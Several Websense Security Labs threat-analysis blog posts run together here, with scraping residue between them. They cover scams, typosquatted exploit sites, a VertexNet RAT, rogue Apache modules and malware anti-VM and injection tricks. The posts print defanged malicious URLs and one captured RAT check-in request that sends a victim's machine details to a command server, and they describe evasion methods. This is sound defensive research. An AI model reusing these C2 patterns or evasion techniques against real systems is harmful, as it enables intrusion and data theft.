video.\n(Click here to see what it looks like; a new browser window will open.) \n\n \nThis isn\'t the end, though. The page also has a timeout mechanism.  If the victim doesn\'t play the video they are greeted with a \"Merry Christmas!\" message and are redirected to a fake Facebook page offering some fake free vouchers.  In the following example, some fake Asda vouchers are offered:\n \n Christmas-themed congratulation:\n\n \nThe scam is geolocation aware:\n \n \nHere is a scam page offering some free vouchers from Asda.  This particular page is desgined for UK-based visitors:\n\n  \nThis scam page offers vouchers and rewards from Walmart, Best Buy and Visa.  This particular page is desgined for US-based visitors:\n\n \nThis scam page offers vouchers and rewards from Walmart and American Express.  This particular page is designed for US-based visitors:\n\n\nAs mentioned, the scam comes in many variations and piggybacks on the reputation of many well-known brands. Let\'s have a look at the example from above that piggybacks on Asda. The fake voucher page for Asda takes the victim through the scam step by step. First, in order to get the free voucher the victim has to share the voucher in their Facebook profile. Second, the victim must publish the comment \"Thanks Asda!\" to support the scam. Lastly, the user must click the Like button, which is a scam link.  \n \nAfter the victim completes the steps, their Facebook news feed includes the fake voucher scam and they are redirected to a legitimate website at new.activeyou.co.uk that gives out prizes and supports an affiliate program. The way this works is that any user coming to the site --  thanks to a certain affiliate -- and who participates, earns the affiliate some money; there is no free voucher after all. The affiliate here obviously engages in illegal methods to advertise and generate traffic to a website that earns them money.  The affiliate ID is seen in the next image, marked in red in the URL where it states affid.\n \nNo free vouchers after all:\n \n \nThe scam infrastructure and intelligence: accounts on Afraid.org as doorways \nWebsense\'s partnership with Facebook alerts us and invites us to assist Facebook in mitigating such scams using Websense ACE. We released this blog because we saw a spike in our data feeds and a rather large number of different URLs that are used for scam purposes that have a relation to each other. We think that Facebook is doing a good job of cleaning up and removing posts related to this scam. \nWe spotted more than 3,000 unique URLs used for this scam on Facebook.  The high variation is used by cyber criminals to assure persistence and redundancy in case some URLs or domains get blacklisted.\n \nThe scam peak as seen by the ThreatSeeker Network. This plots the number of new hosts seen hosting the scam vs. the number of active hosts using this scam.\n \nOne of the most interesting findings is that most of the scam hosts used in the attack use the DNS servers of the free service at freedns.afraid.org. Essentially we found that all the name-server records used by websites involved in the attack use Afraid.org DNS server and point to ns1.afraid.org (see illustration below)\n\nfreedns.afraid.org is a free service that offers domain owners free DNS services. For example, a domain owner can use the DNS servers of freedns.afraid.org and have them point to their website\'s IP address. freedns.afraid.org also allows users to manage those free DNS services via an account. It allows account holders to add various subdomains to their main domain and optionally point those new websites to different IP addresses. For example, if John Doe owns johndoe.com on IP address x.x.x.x, he can go to freedns.afraid.org, create an account, and use their DNS servers to point to their website IP address at x.x.x.x. On top of that, John can easily add DNS records to subdomains of his main website (johndoe.com) via his account at freedns.afraid.org. At his option, John can have those subdomains (that essentially represent different web sites) point to different IP addresses. So, for example, John can use his DNS account with freedns.afraid.org to have johnsfriend.johndoe.com point to y.y.y.y.\n \nScam host example and its DNS record:  91037997396662norryyoutubecomplay10pegahihypupegahihypu.opbco.web74.net\n\n \n \n \n \nIn this attack, accounts/hosts on freedns.afraid.org have been used to serve scams URLs by pointing subdomains of legitimate hosts to the attackers\' infrastructure. If we examine some of the scam hosts involved in the attack, we can see that they point to a different IP address than the one used at the host level. Websites at the host level vary in purpose and appear to be legitimate. We verified that this pattern is consistent with all of the approximately 3000 instances that we found involved in the attack. In the next example, we present an example scam URL that is used for the scam that is hosted on an IP address that cybercriminals are using to host the scam (213.152.170.193), while the host is hosted on a different IP address that hosts a legitimate website (65.96.116.101), in this case a personal cooking blog.

This way, the malware does not need to create a new PE file on the disk, and the original malware becomes a totally different one in memory, even the PE header and code entry point, thus leading us to the next phase. The phase two file is encrypted too, and implements many anti-debug tricks.\n\n\n	\n\n\n	 \n\n\n	Taking a dive into the anti-debug measures that modern malware uses, we see that this one detects all the running processes in the system, and tries to find “VmwareService.exe”, ”VmwareUser.exe”, ”wireshark.exe”, and other monitors or antivirus processes. It does not use plain text strings to find all the process names. Instead, it uses some self-defined hash algorithm to calculate the name of a process into a HEX string, which is commonly used in shellcode to locate all the needed APIs.\n\n\n	\n\n\n	 \n\n\n	This sample also queries the registry value of “HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\disk\\enum”, checking this local disk value and whether the 8-12 character of disk name references “awmw” or “xobv” or “umeq”. In other words, the malware checks to see if it\'s been run under VMware, VirtualBox, and QEMU (an open source processor emulator). If it has, the malware stops infecting the computer. **Notice the malware creator\'s typo on \"awmw\"; it should be \"awmv\".\n\n\n	\n\n\n	 \n\n\n	After carefully checking its environment, the malware continues to the next phase of decrypting itself. Instead of modifying the Windows Update Agent service “wuauclt.exe” file on the disk, or trying to find the process memory of “wuauclt.exe” and inject malicious code into it, the malware maps an image of \"wuauclt.exe\" into memory using the “Section” kernel object. It then injects all the malicious code into the memory page, and finally executes “wuauclt.exe”. \n\n\n	\n\n\n	 \n\n\n	Because the malware does not modify the Windows Update Agent on the hard disk and instead patches the process in memory using the “Section” kernel object, some monitors that hook APIs like “OpenFile” or “CreateFile” fail to catch this injection. Also, because the malware does not call “WriteProcessMemory”, it is hard for AV monitors to catch this memory injection.\n\n\n	\n\n\n	 \n\n\n	This patched “wuauclt.exe” with the push-return above performs the real malicious function. It connects to several remote servers and downloads extra malicious binaries from some of them. Some of the website servers it connects to and many of the URLs are hosted at the same IP address:\n\n\n	\n\n\n	 \n\n\n	It downloads malicious binaries from these remote servers:\n\n\n	\n\n\n	 \n\n\n	During our analysis, some of the remote servers were still available, and the malicious binary files were still downloadable. Websense customers are protected from these and other threats by Websense ACE (Advanced Classification Engine) in multiple stages: from the very first arrival of the malicious emails to all the \"phone home\" C&C URLs and malicious binaries.\n\n\n	Don\'t miss our Websense® 2013 Security Predictions to read about this prediction, among others: Cybercriminals will become more \"virtually aware\" and find modern bypass methods to avoid detection.', 'https://www.forcepoint.com/blog/security-labs/malicious-email-mms-targets-mobile-phone-users\n');

While Santa, along with his ever-loyal team of elves, his reindeer, and, of course, Mrs. Claus, are no doubt working their way through the mountain of letters and wish lists from the world’s good little boys and girls, some bad little boys and girls are looking to capitalize on his backlog of correspondence. They claim to offer alternative services to ensure that your \"little ones\" receive personalized responses from Santa.\n  As is often the case in today’s unsolicited email world, the links within these emails don’t take you to a reputable and Santa-approved communication facilitator. Rather than being prompted for personal details about your little ones (which in itself poses an interesting discussion of Internet safety and the sharing of personal details with random websites) you’ll probably find that you’re either a winner, or a potential winner, of some new fruit-branded hardware. All you have to do is complete a survey or an affiliate offer.\n  These methods were discussed in our Black Friday / Cyber Monday Survival Guide, and merely serve to line the scammer\'s pockets with affiliate referral cash. They also let the scammer harvest your personal data for further use.  While our customers are protected from this and other threats by Websense ACE (Advanced Classification Engine), it would be wise to share details of this campaign with friends and family members that might be more likely to be taken with the idea--especially when Rudolph\'s(?) \"winning prize\" carrot is dangled.\n \nMessages of this nature that we are currently detecting and blocking appear to be somewhat consistent. Their techniques include:\nHiding blocks of text or keywords in the HTML source in an attempt to appear legitimate to automated processes In this example, the font color is set to white (#ffffff) in order to make it invisible to the person reading the email:In this case, the text is taken from the Wikipedia article on Larry Hagman. \n  Some of the messages we’ve seen recently deliver the main message as an image loaded from a website.

No amount of form-filling, survey submissions, or offer completions are likely to result in the desired letter from Santa Claus. Therefore, if you are looking to assist Santa with his letter-sending duties, please stick to reputable organizations.

FOREX is the foreign exchange market where international currencies are traded, and nowadays, it\'s used by millions of people around the world.\n\nThe targeted website is a popular FOREX website called \"Trading Forex,\" located at hxxp://tradingforex.com. One of the questions that is raised when encountering such a compromise is whether some cybercriminal shift their focus from mainstream online money management systems of banks and stock exchanges to \"easier wins\" with online systems and services that are likely to be less mature from a security perspective. Another interesting fact is that the dropped backdoor at Trading Forex is written in Visual Basic.Net and requires the Microsoft\'s .NET framework to be successfully installed and operational on the victim\'s computer.\n\nWebsense customers are protected from these and other threats by  Websense ACE (Advanced Classification Engine).\n\n\n\nAt Websense Security Labs™ we are used to seeing this kind of injection, based on malicious Java applets trying to exploit  Java vulnerabilities, and we have blogged about them several times. In this case, however, investigating the malicious JAR file brought up some interesting details. The malicious code has been injected in the bottom of the page, as shown better here:\n\n\n\nAt this time the website hxxp://libertyresarve.info seems to be active,  however in the latest days we seen that sometimes was turned off although was still possible retrieve the content through the Google cache. We can also be sure that it has been used for typosquatting activities against the real Libertyreserve (the virtual currency organization) website as shown below:\n\n\n\nThe message in red which has appeared on that Web page is a clear attempt to convince users to load the malicious Java applet in some way. Below is the real content of Libertyreserve.com:\n\n\n\n At first glance, the JAR file seems to be written not to exploit Java vulnerabilities, but just to load a binary file hosted at \"hxxp://www.libertyresarve.info\":\n\n\n\nBasically the Java code is just another Java loader which requires user interaction to successfully load the binary file \"123.exe\". One interesting point in the screenshot above is that we can also see in the MANIFEST-INF that the Java applet has been signed with a certificate. Trying to evaluate the certificate validity with the tool \"jarsigner\" (included in the Java SDK) shows that the certificate expired on 5 October 2011, but the applet was signed on 7 July 2011:\n\n\n\nDue to the expiration of the certificate, it is possible to get the reasons why this JAR file has been considered as suspicious from the details of the usual Java warning message: \n\n\n\nBy clicking on the details offered by the Java plugin alert, it is possible, as shown, to retrieve the issues related to this untrusted Java applet. This is a mitigation for the success of the attack, but is also true that due to the kind of users on this website, maybe that they are inclined to accept this malicious JAR due to a potentially  false sense of security and trustability.  Another interesting viewpoint has been found in the associated binary file.  The detection of this file still seems low, as reported here:\n\nhttps://www.virustotal.com/file/66fdad1bc63eca7d8124d16c83322a6ca3b45546a70ddb0a9e122be6e9aaebfb/analysis/1353429475/\n\nHowever, we tried submitting the executable file \"123.exe\"  to Websense ThreatScope™ with the following result:\n\n\n\nFrom the full analysis reported here, it has been detected that the C&C called by the malware  is \"hxxp://firestormm6t.no-ip.info\" and seems to be associated with the IP address 46.166.129.110:\n\n\n\nThe file \"123.exe\" seems to be a \".NET\" file probably written using C#. From deep analysis of the network traffic, it is possible to retrieve the exchanged packets between an infected system and the C2 (reported above) . It is easy to see that at least for the network activity detected, all the information is encoded using a plain BASE64 encoding. For example, the following screenshot reports the first request from the infected system to the C&C:\n\n\n\nThe screenshot above shows the exchange of data between the infected system (in blue) and the C&C (in red). In this case, decoding one of the BASE64 strings enables us to understand that all the BASE64 strings above are the strings reported in the open windows on the desktop of the infected systems. So for example:\n\n\n\nOnce decoded it became:\n\n\n\nThat is the caption of the Wireshark windows we used to get the traffic. We also detected other functions, such as the screenshots of the desktop taken by the malware. Below, it is possible to recognize the JPEG marker (\"JFIF\") and the keyword  \"CAP\" which is without doubt the short form for \"CAPTURE:\"\n\n\n\nThe binary file, as mentioned above, seems to be written using the .NET Framework using Visual Basic .NET . By opening  the the .NET disassembler \"ILSpy\" (an open source .NET disassembler powerful and robust enough to obtain not only the .net opcode but also the high-level language behind the .NET applications), it has been possible to detect the main functions with the list of the commands used to exchange information and data between the C&C and the impacted systems.  For example, the function \"Init\" is the first function called to collect the basic information from the systems on which the executable file is run:\n\n\n\nThe char \"l\" and the char \"v\" are the command init sent by the malware at the first execution, as discovered by the captured network traffic. It is also possible to detect other commands such as the check of the Service Pack (command \"SP\"):\n\n\n\nOr for example the function which is able to detect the keys pressed by the user after pressing Enter (command \"[ENTER]\"):\n\n\n\nThere are also other features such as the detection of the CPU architecture (32 or 64 bit), functions to locate files by dates, and more. At first glance this malware seems very well written, and it uses an interesting obfuscation mechanism to retrieve and store the data required.', 'https://www.forcepoint.com/security-labs/forex-website-targeted-did-cybercrooks-find-weakest-link-online-money-management\n');

We also see scams that entice victims to complete survey scams in order to harvest personal information.\nIn addition to wearing appropriate clothing and footwear as well as remembering to drink sufficient amounts of water, Security Labs presents our Black Friday/Cyber Monday Survival Guide:#1 \"If it looks too good to be true...\"\nLarge retailers may offer knock-down prices and fantastic first-come-first-served deals however, think twice before clicking on that email link or completing that purchase on that \'new\' website you\'ve just found.\nFake websites are created by scammers to entice buyers using terminology such as \'wholesale prices\' or \'liquidated stock\'. Combine this with a Black Friday or Cyber Monday deal and you could be convinced that you\'ve just secured the latest gadget at a fraction of the retail price. In reality, you\'re handing over your payment details to a scammer who will at best only charge you for the fictitious goods.Apple products for less than half the retail price... Really?\n\nThese scams are unfortunately not limited to dedicated scam websites and individual fictitious products infiltrate well-known online retailers and auction sites. Successfully purchasing bargains through third-party sellers via a retailers \'marketplace\' or an online auction is common practice, however, apply rule #1 and consider rule #2.\n\n  Remember: If it looks too good to be true... it probably is\"\n#2 \"It takes many good deeds to build a good reputation...\"\nMany interactions in our everyday lives rely on reputation and our online interactions should be no different. Just because an email claims to be from a particular retailer or organization it doesn\'t mean that it is. Many online retailers have spent a great deal of time and effort building their reputation and are unlikely to dilute their brand by sending emails from free webmail accounts or creating websites on obscure URLs.\n  If you have suspicions regarding an email or link don\'t follow it. Go directly to the organization\'s website before logging-in or making a purchase and don\'t be afraid to contact an organization to verify the validity of something you\'ve received. \nSuspicious URLs can also be checked using our ACEInsight Site Analysis tool, a free service powered by the Websense TRITON™ architecture that will perform a real-time security and content classification check.\n\nIf you\'re submitting any personal information online; many retailers will use additional security features such as HTTPS and Extended Validation Certificates (EV) and these are evident by a padlock icon and organization name appearing on the address bar in green. These steps indicate that additional verification steps have been taken and confirm that authenticity of the website you\'re visiting, if you\'re making an online purchase or submitting personal or financial information these measures also help to secure your data in transit and protect it from prying eyes (man-in-the-middle attacks).\nReputation confirmed by an Extended Validation Certificate\n\nIf you\'re considering a purchase from a marketplace seller or online auction remember to review ratings or feedback and confirm that they are reputable. Additionally, avoid using payment methods outside of the marketplace or auction site as these are common scam traits - not only are you likely to fall outside of any payment protection schemes, many scammers will encourage you to use money transfer methods that are difficult to track and recover.\nRemember: \"It takes many good deeds to build a good reputation, and only one bad one to lose it.\" - Benjamin Franklin\n#3 \"Loose lips...\"\n  It\'s possible that not even your closest friend knows your date of birth (for those of us above a certain age), your mother\'s maiden name or indeed the name of your first goldfish let alone your PIN, card verification code and credit-card number! Given this, think carefully before surrendering this information and be suspicious of any email, website or social network post that requests personal and/or financial information... you may find that your details are being used to fund someone else\'s shopping-spree!\nPhishing campaigns, as shown in our recent Insights Blog, are most popular on Mondays and Fridays which just so happens to tie-in with this weekend\'s busy shopping period. Financial organizations and retailers are highly unlikely to ask you to \'Verify your account\' or \'Unlock your account\' and then have you submit all of your personal details again. If in doubt, visit the organizations website directly or contact them via alternate means to confirm their request. \nIf you\'re submitting any personal information online, confirm the reputation (rule #2) of the organization. Will they be protecting your data and using it for its intended purpose? Or is this a ruse to gather personal information for further spam/scam campaigns or even identity theft?\nRemember: \"Loose lips sink ships!\"\n#4 \"There\'s no such thing as a free lunch...\"\nAs often the case when invited to lunch with family members, we may pay a small price for lunch by fixing that printer problem or removing malware from the abused family PC... a small price compared to the time and effort required to put the meal in front of you. In the case of scammers, the free lunch or more to the point \'free gift card\' or \'free hugely popular consumer electronic device\'  is offered in return for the simply filling in an online survey or completing a qualifying purchase in order to secure that vastly more expensive item. \nCommonly these scams utilize emails and social network posts claiming to be from popular brands informing you that \'You have received a gift card from us\' or \'Giveaway\'. The links of course, if not leading you to malicious websites that could potentially compromise your machine, lead you through a series of sites to harvest your personal information and/or entice you into purchasing memberships, ebooks and other items all in order to secure that great freebie.  Once harvested, your data at best could be passed to marketing organizations to further target you, or at worst for identity fraud. \nFree iPad?\n\n\n\nFree giftcard?\n\n\nAsk yourself the question, would the brand really give away high-value gift-cards and goods in return for a completed survey? Whilst prize draws and money-off coupons are common rewards, consider our other survival guide tips before answering the question.\nRemember: \"There\'s no such thing as a free lunch... somebody has to pay\"\n#5 \"Attachment is the great fabricator of illusions...\"\nHere in Security Labs, we\'ve seen, blogged about, and protected customers from countless malicious email campaigns which misuse popular brand identities to entice trusting consumers to open malicious attachments which then lead to the compromise of their machines. Whilst no specific examples of Black Friday / Cyber Monday malicious emails are being detected at the time of writing, this attack vector could easily be exploited to take advantage of those of us waiting for an all-important email laden with shopping bargains.\nHowever enticing, interesting or compelling an email attachment looks - don\'t open it unless you are sure of its source.\nAttached order confirmations or coupons may appear to be legitimate, particularly when you\'re placing a number of orders online. Confirm that these are related to transactions that you\'ve made and consider the behavior. Is it normal for this particular retailer to send you the order confirmation as an attachment rather than within the actual email?\nRemember: \"Attachment is the great fabricator of illusions; reality can be attained only by someone who is detached.\" - Simone Weil\n#6: \"The hair is real...\"\nThose of you camping outside stores awaiting the bargain stampede are sure to be using mobile devices to stay up-to-date with the latest offers and news... but how do you keep on top of numerous retailers and offers? A quick search on any mobile application store or marketplace is sure to reveal any one of a number of apps that will take care of this task for you, aggregating numerous news feeds, offers and store deals into one handy app. The question is, can you trust it? As seen with the launch of many high-profile mobile games and applications, attackers exploit mobile users by publishing fake applications which may give you a little more than you\'ve bargained for... perhaps premium-rate SMS ,or just harvesting personal data from your smartphone.\nBefore installing any application, be sure to check the permissions that it\'s requesting . Does a simple offer app really need the ability to modify or delete items on your smartphone\'s storage card? How about it integrating with your phone book? If in doubt, don\'t install it. And, of course, check the reviews to confirm that the app\'s reputation is trustworthy.\nRemember: \"The hair is real; it\'s the head that\'s fake.\" - Steve Allen\n#7: \"I alone cannot change the world...\"\nIn the sense of community and coming together, please do leave a comment and share anything suspicious you encounter this weekend. Whilst we\'ve prepared this survival guide, albeit in a light-hearted fashion, for Black Friday and Cyber Monday, these threats and our guidelines are relevant throughout the year.

The domain name, \"inte1sat\", substitutes the number \"1\" for the lower case letter \"l\", an example of \"leet\" substitution that surfaced in the 1980s and is still used today. (Leet is a method of constructing words by substituting numbers for letters.) \n\nThe first step in our investigation was to look into the content of the URL: hxxp://www.inte1sat.com:\n\n\n\nAs so often happens, the content revealed what appeared to be another Java exploit attempt. We decided to set aside content analysis for the moment and investigate instead the domain name spelled in its normal alpha-English form: \"Intelsat.com\". Googling Intelsat.com we learned that it is a company involved in satellite technologies and satellite-enabled services (including IP trunking, telecommunications, and more).\n\n\n\nAlthough it was tempting to conclude that \"inte1sat.com\" is just a \"typo squatting domain\", we proceeded to Google \"www.inte1sat.com\" with the following interesting result:\n\n\n\nAt first glance, as shown above, it appears that the domain is specified in documents stored on the USA Federal Communications Commission (FCC) website. The FCC mandate states: \"The Federal Communications Commission regulates interstate and international communications by radio, television, wire, satellite and cable in all 50 states, the District of Columbia and U.S. territories.\"\n\n\n\nAt this point we looked at the publicly accessible PDF files that came up in the Google search. When we looked for instances of \"inte1sat.com\" in the files, we didn\'t find any. The only explanation we could think of, which is highly speculative, is that there might be a misidentification of the character \"l\"  by the OCR algorithm of the Google PDF caching mechanism when the PDFs files are scanned or faxed as shown below:\n\n\n\nAlthough we couldn\'t yet connect any dots, the collection of weird indications kept us going. We decided to return to the content of the original domain.\nThe content clearly shows that it is using Metasploit to retrieve a JAR file that uses the well-known CVE-2012-4681 that hijacks the JAVA Security Manager by generating exceptions. Evidence of this is shown below:\n\n\n\nHere is the code used to generate the exceptions:\n\n\n\nWhen the exploit is successfully executed, it loads and runs the EXE binary file \"IrFKDDEW.exe\" embedded in the JAR file. The MD5 of this file, as reported here, indicates that it leads to a backdoor. We submitted the binary file to Websense ThreatScope™ and it detected malicious threats as reported here. Analyzing just the network traffic generated by the malware, we discovered the following behavior:\n\n\n\nEach HTTP request was directed to the following domain:\n\n\n\nBy retrieving and examining the HTTP stats from Wireshark, we discovered that the requested URLs are unique, except one that is called twice. Also, the pattern of requested URLs looks something like a pseudo random generation algorithm:\n\n\n\nThe URLs are \"called\" on a regular time interval. C&C (command and control) is \"net.chiquita-brands.com\" hosted at IP address 14.36.201.151. Robtex provides this information about that IP address:\n\n\n\nLooking at our ThreatSeeker Network database, we see that this host has been known since July 9, 2012. We also note that it appears to be largely unknown to the greater security community, according to Virustotal.\n\n\n\nNext we used Robtex to examine the WHOIS record for chiquita-brands.com:\n\n\n\nUsing the registration information, we found a paper authored by Command Five that indicates that the contact has been registering domains involved in APT and corporate cyber espionage attacks. The entire document is available here: http://www.commandfive.com/papers/C5_APT_SKHack.pdf\n\nWe cannot confirm that there is a problem in the Google OCR PDF caching mechanism that results in instances of \"inte1sat.com\" showing up in search results, particularly those of papers hosted by the FCC. We can conjecture that if there is a flaw, it is being exploited via a typo squatting technique to deliver an exploit.  \n\nContinuing our search, we discovered additional strong evidence. Going back to the beginning of the analysis, it turns out that the IP address 174.139.91.163, where \"inte1sat.com\"  is hosted, also hosts many other domains. Four especially attracted our interest. Specifically:\n\n\n\n- hxxp://net.peasoul.com has been used in Chinese hacking activities and in targeted attacks as reported in this Pastebin link:  hxxp://pastebin.com/yKSQd5Z5\n\n- hxxp://www.attwirelessnetwork.com is another obvious typo squatting domain  for the original hosted at www.wireless.att.com (AT&T Wireless website )\n\n- hxxp://www.rad-waste.org is a clear typo squatting domain for the original web site: hxxp://www.radwaste.org, a Web site for radioactive waste management professionals\n\nEach of the typo squatting hosts are active at this time and contain the following content:\n\n\n\nUsing Robtex to retrieve the WHOIS information, we discovered that three of the domains are registered to the name \"Xiaohua Dai\":\n\nRegistrar for hxxp://rad-waste.org\n\n\nRegistrar for hxxp://attwirelessnetwork.com\n\n\nRegistrar for hxxp://inte1sat.com\n\n\nOnly one is registered to another name (Jiaxin Technology - Yong Liu): \n\nRegistrar for hxxp://peasoul.com\n\n\nThere are also several other domains detected on IP address 174.139.91.163, including ssl.mailyuidyahooapis.com and bloomberg-global.com. These may also be used for typo squatting attacks, but at this time those sites are not active.\n\n\n\nWebsense customers are protected from these and other threats by Websense ACE (Advanced Classification Engine).', 'https://www.forcepoint.com/security-labs/strange-case-inte1sat-domain-name\n');

Usually, when an attacker gains control of a site, the life span of the injected code to that site depends on how fast the website administrator notices malicious content added to their web pages. \nOne of the tactics that cybercriminals now employ to increase the life span of injected code is to install rogue modules on to compromised web servers. These modules hide themselves and the presence of an injection from system and website administrators, security researchers and criminal competitors. \nImage 1: The red arrow below shows the difference between the life span of typical malicious injected code and code injected by a rogue Apache module:\n\n\n\nA lot of blogs, articles, and forum discussions have appeared about so-called \"underground\" forums selling all sorts of hacking tools for \"penetration testing.\" We are monitoring these forums and would like to share some information about web server rootkits. Recently, we\'ve started seeing more tools on sale like web server rootkits for injecting and hiding malicious code in all websites hosted by web servers. In the past, these tools were sold only in closed communities and to a small set of people, but researchers, website administrators, and web server administrators have uncovered these tools and started to mentioned them in blogs and forums.\nWe have seen several forum discussions talking about malicious iframes magically appearing on different websites and constantly changing the injected URLs. Administrators of affected sites and servers have not been able to identify what the problem is.\n\nImage 2: The following forum discusses how injected iframes are constantly appearing on different sites on a server:\n\n\n\nAccording to underground forums, you can buy the \"module Apache/2\" for $1,000. Some features described by the seller include iframe injection in php/html/js files, allowing access only by unique IPs, and periodically renewing URLs, all of which add value if used in conjunction with an exploit kit. \nApart from injecting iframes, such modules have a long life cycle, successfully staying in stealth mode and remaining undetected by administrators. Stealth functionality is achieved by collecting and recording IPs used by admins/roots to log into a server, going quiet when the user is logging from these IPs by not showing iFrames to non-unique users, and then going into quiet mode again when suspicious processes like tcpdump are detected. When the admin/root logs off, the module becomes active again.\n\nThe author of the rogue Apache module shows in the following statistics how successful this tool has been when used to install rogue AVs with different exploit kits.\n\nImage 3: Stats from exploit kits showing successful exploits with the help of the web server Apache rogue module:\n\n\n\nHow does Websense protect customers from malicious code injected by rogue modules?\n\nWhen an end user browses to a website injected with malicious code, we protect them with Websense ACE (Advanced Classification Engine). ACE technologies analyze websites in real time, guarding against any malicious iFrames that mysteriously appear on websites.\nOne of the conditions that the rogue Apache module allows is for injected code to appear on a website only if a user with a unique IP address accesses the website for the first time or uses specific referrers. The nature of the rogue Apache module allows injected content to appear or disappear dynamically based on different parameters as described, which makes it much more challenging for security solutions that don\'t employ real-time content analysis capabilities in their products. Websense real-time analysis parses and analyzes websites on the fly and checks for malicious content. When injected code is found, the website is blocked and customers are protected.\n\nImage 4:  Website blocked by Websense real-time analytics:', 'https://www.forcepoint.com/security-labs/long-live-injection-and-how-it-affects-you\n');

Reports have shown a flurry of new attacks and vulnerabilities that have turned that cute little green robot into a proverbial punching bag.\n\nHere\'s some of the blow-by-blow coverage of the carnage:\n\nThe Internet Crime Complaint Center (IC3) recently reported that crooks are tricking users with phony work-at-home lures into clicking links to pages that secretly download malware called Loozfon onto their devices. The app pilfers address book information and sends the attacker the infected device\'s phone number.\n	IC3 warned in the same advisory about spyware called FinFisher that can be inadvertently downloaded by visiting an infected site or by opening a text message made to look like a system update. FinFisher gives attackers anytime, anyplace remote control of the device.\n	A researcher with the North Carolina State University computer science department recently produced a proof-of-concept app that takes advantage of a vulnerability in the Android Open Source Project that would give an attacker the ability to send SMS messages from an infected phone without user permission. The vulnerability exists on all recent Android platforms.\n	Researchers with Leibniz University of Hanover in Germany released a study that showed how even legitimate apps in the Google Play marketplace can be a threat. The researchers showed that a number of these apps leaked sensitive information to man-in-the-middle attacks through improper use of the SSL and TLS security protocols.\nThe IC3 advisory offered more details about FinFisher and Loozfon, but more importantly the experts among them offered some choice advice for users to bolster security and fight back threats to their mobile security. Among the most important pieces of information, IC3 suggests:\n\nGetting familiar with all your device\'s settings and turning off features you don\'t use so they aren\'t used against you.\n	Abstaining from jailbreaking the phone, which completely destroys any of the default security settings on the phone and consequently is an install state which many malware author\'s seek out for device targets.\n	Keeping current on software updates.\n	Avoiding risky links the same way you\'d avoid them on your PC.\nAs enterprises, small businesses and consumers all deal with the influx of malware into the mobile space, each must do their part to protect themselves. For many businesses, that will also involve adding critical mobile security to their technology arsenal. But technology can\'t be deployed in a vacuum.

The targeted website (hxxp://www.sarifire.ir) seems to be a portal documenting the activities of firefighters in the city of Sari, located in northern Iran. Given Iran\'s high profile in recent news stories, we decided to analyze this case. At this time, the website still seems to be injected, as shown below:\n\n\n\nIn the following snippet of code, we see yet another Java-driven attempt to install the specified \".exe\" file referenced by the URL hxxp://thesilentecho.com/tmp/kav.exe:\n\n\n\nAlthough at this time the JAR file is not available, a quick Google search using the name of the Java class (\"alakazam.class\") in the code snippet above reveals the following Pastebin submission (http://pastebin.com/DbT64XfG). This code seems directly related to the Java JAR file used in this attack:\n\n\n\nIn the red box, we see the same parameter name that is used in the applet section of the injected website. Also, from what we see, the website seems to be compromised from the server side, because every requested web page contains the same injected code. As reported recently in a previous blog post, the injected code does not exploit any Java vulnerabilities. Instead, it tries to load the binary file \"kav.exe\" using the \"url\" parameter. We decided to focus our attention on looking for some interesting patterns, which led our investigation to suspect a targeted attack, based on the kind of malware used and the website\'s audience. Although this is a government-affiliated portal, the targeted users could be civilians as well as users from inside the government\'s LAN. We submitted the binary file for Websense ThreatScope™ analysis, with the following result: \n\n\n\nThe full report is found here: http://aceinsight.websense.com/fileanalysisreport.aspx?rid=8C0C7F7F736D4AFDB075F766AE466C87. From the network traffic exchanged between an infected system and the C&C, it is possible to retrieve clear syntax of the commands sent as the first dialogue. For example, the following command:\n\nhxxp://www.chat-mr.com/images/.vr/adduser.php?uid={a81f29c0-dc94-11e0-b358-806d6172696f--337009188}&lan=10.74.33.100&cmpname=ADMIN-0B1297EC9%20[Administrator]&country=English%20(United%20States)%20+1&cc=US&idle=283&ver=v1.2\n \n\nis quite self explanatory, revealing the UID, the LAN IP address, the computer name (cmpname parameter), and other geographical data. The parameter \"ver\" is the release version of this RAT. This kind of  HTTP request is usually present on botnets and implemented around the HTTP protocol as a way to communicate with the C&C. At the time of this analysis, the domain \"www.chat-mr.com\" looks like it has expired, but the whois information seems to have been continuously updated. Here is the graph view from Robtex:\n\n\n\nWe started a static analysis of the binary file \"kav.exe\" (MD5: F6B258F2C3F10A5D35C8FF852FB6A004). The file is not packed, permitting easy access to clear text strings. One of the most interesting is this one:\n\n\n\nThe string above represents a debug file used during the building of the binary \"kav.exe\", in which we clearly see the name of the RAT: VertexNet. An Internet search led us to one of the forums where this RAT has been reported:\n\n\n\nFrom other strings, we can determine the features implemented in this RAT, as follows:\n\n\n\nAs confirmed also by an analysis released by an individual researcher,  VertexNet has the usual features of other tools of this kind, such as: downloads files from a URL, runs new processes, updates the C&C, forces the user to visit a URL, and so on. We think that one of the most used features may be the activation of a keylogger, highlighted in the screenshot above. \n\nDue to the potential audience for this website, we tried to figure out the reasons of this attack. We can be lead into thinking that this could be a reconnaissance attack with the aim of breaching the systems of some affiliated government internet user. Due to the tools used (the VertexNet  RAT is free, as well as the control panel)  we could reach the conclusion  that this is probably an isolated injection to impact some systems, thanks to some misconfiguration inside the hosting provider of this website.\n \n\nWebsense customers are protected from this and other threats by Websense ACE (Advanced Classification Engine).', 'https://www.forcepoint.com/security-labs/iranian-firefighters-website-compromised-serve-vertexnet-rat\n');

To help improve incident response and stop cyber-threats, the Government of Canada is investing $155M in our cybersecurity strategy. With the evolution of online attacks and our country\'s number two ranking for hosted phishing sites, this initiative is critical for protecting the country\'s enterprise and cyberspace.\n\nAccording to recent Websense Security Labs research, Canada currently holds second place under the United States for the top countries hosting the most phishing sites. Combined, they account for more than 80 percent of all the phishing sites we encounter. Why, you ask? American and Canadian websites have great reputations on the Internet making them a lucrative target for cybercriminals.\n\nToday, hackers have adjusted their phishing tactics in ways that get past traditional email security. Increasingly, we are seeing a shift from mass phishing campaigns, where indiscriminate emails are spammed out, to a more concerning type of attack targeting individuals with highly customized content - this is what is known as spear-phishing.\n\nJust a few weeks ago, hackers breached an unclassified computer network used by the White House via a spear-phishing attack. And, in February 2011, the Canadian government was hit by a spear-phishing attempt. The hackers fooled Canadian federal IT staff into providing access to government computers and eventually gained access key government systems.\n\nBecause of this, employees, executives in particular, should question the legitimacy of emails during this rise in spear-phishing attempts. Don\'t be a victim. Here\'s how spear-phishing works and how you can protect yourself.\n\nStep 1 - Hackers target recipients by gathering intelligence on them from the likes of social networking websites.\n	Step 2 - Hackers compromise a legitimate domain or server, where targeted recipients may have an existing relationship, to gain access to a legitimate and therefore reputable email address.\n	Step 3 - Hackers use gathered intelligence to create phishing emails, which are sent via a 